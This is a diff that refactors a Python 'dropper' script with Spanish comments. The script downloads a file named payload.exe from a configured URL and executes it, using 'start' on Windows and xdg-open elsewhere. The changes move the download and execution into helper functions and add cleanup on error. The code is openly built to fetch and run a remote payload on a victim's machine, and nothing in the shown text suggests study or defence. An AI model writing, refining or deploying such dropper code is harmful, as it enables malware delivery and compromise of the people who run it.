@@ -1,12 +1,11 @@
 import os
-import requests
 import logging
-import subprocess
+from utils import download_file, execute_command, clean_up
 
 # Configuración del registro
 logging.basicConfig(
-    filename='logs/dropper.log', 
-    level=logging.INFO, 
+    filename='logs/dropper.log',
+    level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s'
 )
 
@@ -18,14 +17,8 @@ PAYLOAD_PATH = os.path.join(PAYLOAD_DIR, 'payload.exe')
 def download_payload(url, destination):
     """Descarga el payload desde la URL especificada y lo guarda en la ruta destino."""
     try:
-        logging.info(f'Descargando el payload desde {url}')
-        response = requests.get(url)
-        response.raise_for_status()  # Lanza una excepción para códigos de error HTTP
-
-        with open(destination, 'wb') as file:
-            file.write(response.content)
-        logging.info(f'Payload descargado exitosamente en {destination}')
-    except requests.exceptions.RequestException as e:
+        download_file(url, destination)
+    except Exception as e:
         logging.error(f'Error al descargar el payload: {e}')
         raise
 
@@ -34,9 +27,9 @@ def run_payload(path):
     try:
         logging.info(f'Ejecutando el payload desde {path}')
         if os.name == 'nt':  # Windows
-            subprocess.run(['start', path], shell=True)
+            execute_command(f'start {path}')
         else:  # Linux/MacOS
-            subprocess.run(['xdg-open', path], check=True)
+            execute_command(f'xdg-open {path}')
         logging.info('Payload ejecutado exitosamente')
     except Exception as e:
         logging.error(f'Error al ejecutar el payload: {e}')
@@ -52,8 +45,9 @@ def main():
         download_payload(PAYLOAD_URL, PAYLOAD_PATH)
         run_payload(PAYLOAD_PATH)
     except Exception as e:
-        logging.critical(f'Error crítico en el dropper: {e}')
-        print(f"Ha ocurrido un error crítico: {e}")
+        logging.critical(f'Error crítico en el dropper: {e}')  # Registro de error crítico
+        print(f"Ha ocurrido un error crítico: {e}")  # Mensaje de error crítico para el usuario
+        clean_up(PAYLOAD_PATH)  # Limpiar el archivo en caso de error
 
 if __name__ == "__main__":
-    main()
+    main()  # Llama a la función principal para ejecutar el dropper
